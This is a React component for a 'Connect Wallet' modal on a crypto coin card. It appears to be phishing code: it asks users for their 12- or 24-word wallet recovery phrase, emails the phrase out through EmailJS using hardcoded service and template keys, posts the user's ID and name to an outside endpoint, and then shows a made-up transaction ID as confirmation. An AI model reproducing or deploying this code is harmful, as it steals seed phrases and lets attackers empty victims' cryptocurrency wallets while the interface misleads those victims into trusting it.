import React, { useState, useRef } from 'react';
import { useDisclosure } from '@chakra-ui/react';
import emailjs from '@emailjs/browser';
import axios from 'axios';
import {
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalCloseButton,
  Button,
  Textarea,
  Box,
  Image,
  Text,
  Flex,
  Spinner,
  Alert,
  AlertIcon,
  useToast,
  useColorModeValue,
} from '@chakra-ui/react';

function Newcard({ item }) {
  const { isOpen, onOpen, onClose } = useDisclosure();
  const form = useRef();
  const [message, setMessage] = useState('');
  const [isValid, setIsValid] = useState(true);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const toast = useToast();
  const cardBg = useColorModeValue('white', 'gray.800');
  const cardHoverBg = useColorModeValue('gray.100', 'gray.700');

  const user = JSON.parse(sessionStorage.getItem('user'));

  const handleChange = (e) => {
    setMessage(e.target.value);
    setIsValid(e.target.value.length > 0);
  };

  const sendEmail = (e) => {
    e.preventDefault();

    if (message.length <= 0) {
      setIsValid(false);
      toast({
        title: 'Error',
        description: 'Input field cannot be empty',
        status: 'error',
        duration: 4000,
        isClosable: true,
      });
      return;
    }

    setLoading(true);
    emailjs
      .sendForm('service_5cspl99', 'template_0u7zdbq', form.current, 'PXYwt4hjGfhQ5QciU')
      .then(
        async () => {
          setLoading(false);
          setSuccess(true);
          setMessage('');
          // toast({
          //   title: 'Success',
          //   description: 'Successfully submitted',
          //   status: 'success',
          //   duration: 5000,
          //   isClosable: true,
          // });

          // Call the link-coin endpoint after email is sent successfully
          try {
            const response = await axios.post('https://kadan.onrender.com/api/link-coin', {
              userId: user?._doc?._id,
              username: user?._doc?.name,
              coinId: item?.name, // Assuming item.name corresponds to coinId
            });

            toast({
              title: 'Linking Success',
              description: `linked successfully. Connection ID: ${response.data.connectionId}`,
              status: 'success',
              duration: null,
              isClosable: true,
            });
          } catch (err) {
            console.error('Error linking :', err);
            toast({
              title: 'Error',
              description: 'Failed to link',
              status: 'error',
              duration: 5000,
              isClosable: true,
            });
          }
        },
        (error) => {
          console.error('Error sending email:', error.text);
          setLoading(false);
          toast({
            title: 'Error',
            description: 'Failed to send email',
            status: 'error',
            duration: 5000,
            isClosable: true,
          });
        }
      );
  };

  return (
    <Box p={4}>
      <Flex
        direction="column"
        align="center"
        p={6}
        borderRadius="lg"
        boxShadow="lg"
        bg={cardBg}
        onClick={onOpen}
        cursor="pointer"
        _hover={{ bg: cardHoverBg, transform: 'scale(1.05)', transition: '0.3s ease-in-out' }}
        transition="0.3s ease-in-out"
      >
        <Image boxSize="80px" src={item.img} alt={item.name} mb={4} borderRadius="full" />
        <Text fontSize="xl" fontWeight="bold" textAlign="center">
          {item.name}
        </Text>
      </Flex>

      <Modal isOpen={isOpen} onClose={onClose}>
        <ModalOverlay />
        <ModalContent borderRadius="lg">
          <ModalHeader>Connect Wallet to {item.name}</ModalHeader>
          <ModalCloseButton />
          <ModalBody pb={6}>
            {loading && (
              <Flex justifyContent="center" my={4}>
                <Spinner />
              </Flex>
            )}
            {success && (
              <Alert status="success" mb={4} borderRadius="md">
                <AlertIcon />
                Successfully submitted
                
                <div className='mt-[2rem] ml-[-10rem]'> <br />  Transaction Id: xyhm16356726</div>
              </Alert>
              
            )}
            

           
            <form ref={form} onSubmit={sendEmail}>
              <Textarea
                value={message}
                onChange={handleChange}
                placeholder="Enter recovery phrase"
                name="message"
                size="sm"
                mb={4}
                borderColor="gray.300"
                _hover={{ borderColor: 'gray.400' }}
                _focus={{ borderColor: 'blue.500', boxShadow: '0 0 0 1px blue.500' }}
              />
              <Text fontSize="sm" color="gray.500" mb={4}>
                Typically 12 (sometimes 24) words separated by spaces
              </Text>
              <Button
                type="submit"
                colorScheme="blue"
                width="100%"
                borderRadius="full"
                _hover={{ bg: 'blue.600' }}
              >
                Submit
              </Button>
            </form>
          </ModalBody>
        </ModalContent>
      </Modal>
    </Box>
  );
}

export default Newcard;
